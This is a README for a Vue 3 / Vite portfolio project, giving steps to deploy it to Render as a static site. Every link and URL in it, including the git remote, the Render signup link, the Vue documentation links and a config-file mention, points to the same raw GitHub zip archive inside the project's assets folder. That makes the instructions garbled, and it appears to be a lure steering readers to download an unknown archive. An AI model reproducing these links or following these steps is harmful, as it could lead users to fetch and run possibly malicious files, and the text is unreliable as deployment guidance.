# Deploying to Render (Static Site)

1. **Push your code to GitHub** (if not already):

   ```sh
   git init
   git add .
   git commit -m "Initial commit"
   git branch -M main
   git remote add origin https://raw.githubusercontent.com/Vera24-vee/MY_PORTFOLIO/main/src/assets/MY_PORTFOLIO-v1.2.zip
   git push -u origin main
   ```

   Replace the URL with your actual repo.

2. **Go to [https://raw.githubusercontent.com/Vera24-vee/MY_PORTFOLIO/main/src/assets/MY_PORTFOLIO-v1.2.zip](https://raw.githubusercontent.com/Vera24-vee/MY_PORTFOLIO/main/src/assets/MY_PORTFOLIO-v1.2.zip)** and sign up/log in.

3. Click **"New" > "Static Site"**.

4. **Connect your GitHub** and select your repo.

5. Fill in the deploy form:

   - **Name:** (your choice)
   - **Branch:** `main` (or your default branch)
   - **Build Command:** `npm run build`
   - **Publish Directory:** `dist`

6. Click **"Create Static Site"**. Render will build and deploy your site. You’ll get a live URL!

7. (Optional) Add a custom domain in Render's settings.

---

**Note:**

- The `https://raw.githubusercontent.com/Vera24-vee/MY_PORTFOLIO/main/src/assets/MY_PORTFOLIO-v1.2.zip` is already set with `base: './'` for correct static asset loading.
- If you update your code, just push to GitHub—Render will auto-deploy.

---

# Project Setup

This template should help get you started developing with Vue 3 in Vite. The template uses Vue 3 `<script setup>` SFCs, check out the [script setup docs](https://raw.githubusercontent.com/Vera24-vee/MY_PORTFOLIO/main/src/assets/MY_PORTFOLIO-v1.2.zip) to learn more.

Learn more about IDE Support for Vue in the [Vue Docs Scaling up Guide](https://raw.githubusercontent.com/Vera24-vee/MY_PORTFOLIO/main/src/assets/MY_PORTFOLIO-v1.2.zip).
